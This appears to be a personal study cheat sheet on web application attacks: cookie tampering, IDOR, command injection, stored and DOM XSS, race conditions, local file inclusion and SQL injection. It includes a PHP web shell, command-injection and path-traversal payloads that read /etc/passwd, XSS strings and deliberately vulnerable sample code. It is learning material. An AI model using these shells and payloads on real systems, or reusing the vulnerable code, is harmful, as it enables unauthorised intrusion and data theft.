# Web hacking
**Notes**
```<?php
    echo system($_GET["cmd"]);
?>
```

## Common
**Session hijacking**
Set Cookie: session_id = Auth_key | If the admin **auth_key** is on the front end, it's possible to login as admin without credentials





**Cookie tampering**
```curl -H "Cookie: logged_in=true; admin=true"example.com/cookie-test```
Some websites might encode cookies so encode *Cookie: logged_in=true; admin=true"*


**Insecure Direct Object Reference(IDOR)**
_IDOR is a vulnerability that occurs when internal object are exposed without proper authorization checks._

  - INSPECT ELEMENT -> NETWORK -> customer_id.json -> id:10 USERNAME: name PASSWORD: password
  - example.com/profile?user_id=1 -> exploits the ID number -> example.com/profile?user_id=666


## Remote code execution
*a vulnerability that enables attackers to run malicious code on a target server through a web application or network service*

**VULNERABLE CODE**
```
<?php
$output = shell_exec("ping -c 1 " . $_GET['ip']);
echo $output;
?>
```

**EXPLOIT**
`example.com/ping.php?ip=127.0.0.1; whoami`

Or you can upload your own malicious file and use that to run your own commands.

Malicious.php -> `<?php system($_GET['cmd']); ?>`

`example.com/uploads/malicious.php?cmd=whoami`

## Cros-site scripting (XSS)
*Cross-Site Scripting is a vulnerability that allows attackers to inject malicious scripts into web pages when user input is not properly sanitized or encoded.*

 ### Stored XSS (Persistent XSS)
- User input is stored on the server
- Comment sections, forums, user profiles, and product reviews
- Effects every user

**VULNERABLE CODE**
```
    <?php
$comment = $_POST['comment'];
file_put_contents("comments.txt", $comment . PHP_EOL, FILE_APPEND);
?>

<h3>Comments:</h3>
<?php
echo file_get_contents("comments.txt");
?>
```
**Exploit**
`<script>alert('Stored XSS')</script>`

### DOM BASED
DOM-Based XSS exploits insecure client-side JavaScript that inserts untrusted input into the DOM through unsafe sinks such as **innerHTML(), document.write(), insertAdjacentHTML(), eval()**. While **querySelector()** itself is safe, it can become part of a vulnerability when used alongside these unsafe functions.

**VULNERABLE CODE**
*This takes advantage of how **querySelector** is used in the sites javascript.*
```
<div id="output"></div>
<script>
  const params = new URLSearchParams(window.location.search);
  const name = params.get("name");
  // Vulnerable: Inserts untrusted input into the DOM
  document.querySelector("#output").innerHTML = "Hello, " + name;
</script>
```
**Exploit**
`example.com/?name=<script>alert('DOM XSS')</script>`


## Race conditions
Burp suite - **repeater or intruder**(pitchfork attack)

Sending multiple requests simultaneously may trigger race conditions, leading to unintended behavior.

**Such as**
 - Sending multiple withdraw checks before the system can check if theres avaialbae balance
 - Register the same email with diffrent accounts(abusing free trials)
 - Multiple uses of a gift card

## Local file inclusion

LFI is a web application vulnerability that allows an attacker to access files stored on the server 

__example.com/index.php?page=<ins>etc/password</ins>__

You can move up directories with ../../../../ -> __example.com/index.php?page=./../../../etc/password__

.. = parent directory

/ = directory separator

%00 = is a null byte, a special character that tells a computer, Stop reading here.

example.com/index.php?page=./../../../etc/password%00

* F-P-I-T-V-L
  * **file** - xample.com/index.php?file=../../../../etc/passwd
  * **page** - example.com/index.php?page=../../../../etc/passwd
  * **include** - example.com/index.php?include=../../../../etc/passwd
  * **template** - example.com/index.php?template=../../../../etc/passwd
  * **view** - example.com/index.php?view=../../../../etc/passwd
  * **lang** - example.com/index.php?lang=../../../../etc/passwd


Side Note:
_LFI is less common in modern applications due to improved security practices, but it still appears in older systems._


## SQL Injection
database vulnerability that allows an attacker to manipulate queries by injecting malicious SQL code into input fields.
This exploit occurs when user inputs are not properly validated or sanitized.

**It is possible to detect SQL injection vulnerabilities by observing delays in a website’s response time.**
* No Delay -> High probability there is no SQL injection vulnerability
* Delayed Response -> High probability of a SQL injection vulnerability

**example:**
' OR '1'='1

**Possible Vulnerable Inputs**
  * Username
  * password
  * cookies
  * search bar
  * form fields


Side Note:
_SQLMap is a powerful penetration  tool used for detecting and exploiting sql vulnerabilities in web applications._


